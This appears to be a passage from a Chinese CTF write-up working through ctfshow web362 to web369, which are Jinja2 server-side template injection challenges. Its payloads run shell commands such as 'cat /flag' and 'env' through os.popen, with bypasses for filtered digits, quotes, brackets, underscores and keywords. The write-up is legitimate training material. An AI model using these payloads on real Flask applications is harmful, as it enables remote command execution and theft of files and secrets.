single-quoted-string">'os'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web362-数字绕过-half2full"><a href="#web362-数字绕过-half2full" class="headerlink" title="web362(数字绕过 half2full)"></a>web362(数字绕过 half2full)</h4><p>经过测试过滤了数字2和3，但是发现可以140-8哈哈哈</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">140</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>有大佬换成了全角数字也可以</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">half2full</span><span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>      full <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">for</span> ch <span class="token keyword">in</span> half<span class="token punctuation">:</span>          <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>              ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xfee0</span><span class="token punctuation">)</span>          <span class="token keyword">elif</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>              ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token keyword">pass</span>          full <span class="token operator">+=</span> ch      <span class="token keyword">return</span> full  t<span class="token operator">=</span><span class="token string">''</span>s<span class="token operator">=</span><span class="token string">"0123456789"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    t<span class="token operator">+=</span><span class="token string">'\''</span><span class="token operator">+</span>half2full<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\','</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span>０<span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>１３２<span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>或者使用其他方法</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>x<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment"># x 可以为任意英文字母或字母组合</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web363-引号"><a href="#web363-引号" class="headerlink" title="web363(引号)"></a>web363(引号)</h4><p>过滤了单引号、双引号</p><p><strong>GET传参绕过</strong></p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>os<span class="token operator">&amp;</span>b<span class="token operator">=</span>popen<span class="token operator">&amp;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p><strong>字符串拼接绕过</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'0'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'s'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'p'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'e'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'n'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'t'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'a'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">591</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'c'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">' '</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">853</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'/'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'f'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'l'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'g'</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment"># %2B -> +</span><span class="token comment"># ?name=&#123;&#123;url_for.__globals__['os']&#125;&#125;</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">591</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">853</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment"># ?name=&#123;&#123;url_for.__globals__['os']['popen']('tac /flag')&#125;&#125;</span></code></pre><p><strong>chr拼接</strong></p><p>先找出 chr 函数，同过 chr 拼接</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> <span class="token builtin">chr</span><span class="token operator">=</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">chr</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span>  url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre><p><strong>通过过滤器拼接</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>select<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span></code></pre><h4 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h4><p>多过滤了args，用上一个字符串拼接也可以</p><p>过滤了单双引号，args</p><p>values 可以获取所有参数，从而绕过 args</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>ocean<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>ocean<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p>也可以通过 cookie 绕过</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>a<span class="token operator">=</span>os<span class="token punctuation">;</span>b<span class="token operator">=</span>popen<span class="token punctuation">;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI模板注入绕过（进阶篇）</a></p><h4 id="web365-过滤"><a href="#web365-过滤" class="headerlink" title="web365(过滤[])"></a>web365(过滤[])</h4><p>fuzz 字典跑一遍，发现单双引号、args、[]被过滤</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># GET传参</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span class="token comment"># cookie</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Cookie<span class="token punctuation">:</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token comment"># __getitem__ 可以代替方括号</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token punctuation">.</span>pop<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>xx<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>xxx<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Cookie<span class="token punctuation">:</span> x<span class="token operator">=</span><span class="token builtin">__import__</span><span class="token punctuation">;</span>xx<span class="token operator">=</span>os<span class="token punctuation">;</span>xxx<span class="token operator">=</span>env</code></pre><h4 id="web366-过滤-attr"><a href="#web366-过滤-attr" class="headerlink" title="web366(过滤__  attr)"></a>web366(过滤__  attr)</h4><p>过滤了<code>_</code> <code>&#39;</code> <code>&quot;</code> <code>[</code>      <code>|attr</code> 可代替 <code>.</code></p><p>Payload:</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><h4 id="web367-过滤os"><a href="#web367-过滤os" class="headerlink" title="web367(过滤os)"></a>web367(过滤os)</h4><p>Payload:</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>os<span class="token operator">&amp;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>ocean<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>ocean<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>__getitem__<span class="token operator">&amp;</span>c<span class="token operator">=</span>os<span class="token operator">&amp;</span>d<span class="token operator">=</span>popen<span class="token operator">&amp;</span>f<span class="token operator">=</span>read</code></pre><h4 id="web368-过滤双"><a href="#web368-过滤双" class="headerlink" title="web368(过滤双{)"></a>web368(过滤双{)</h4><p>可用 <code>&#123;%print(payload)%&#125;</code> 代替 <code>&#123;&#123;payload&#125;&#125;</code></p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>os<span class="token operator">&amp;</span>c<span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><h4 id="web369-过滤request"><a href="#web369-过滤request" class="headerlink" title="web369(过滤request)"></a>web369(过滤request)</h4><p>没了 request，要自己拼字符了。</p><p><a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters">List of Builtin Filters</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>p<span class="token operator">=</span>a<span class="token punctuation">,</span>op<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#pop</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> lo<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">|</span>reject<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#_</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c1<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>ini<span class="token operator">=</span>a<span class="token punctuation">,</span>t<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__init__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c2<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>glo<span class="token operator">=</span>a<span class="token punctuation">,</span>bals<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__globals__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c3<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>get<span class="token operator">=</span>a<span class="token punctuation">,</span>item<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__getitem__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c4<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>buil<span class="token operator">=</span>a<span class="token punctuation">,</span>tins<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__builtins__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c5<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>ev<span class="token operator">=</span>a<span class="token punctuation">,</span>al<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#eval</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> sc<span class="token operator">=</span>a<span class="token operator">|</span>pprint<span class="token operator">|</span>pprint<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span 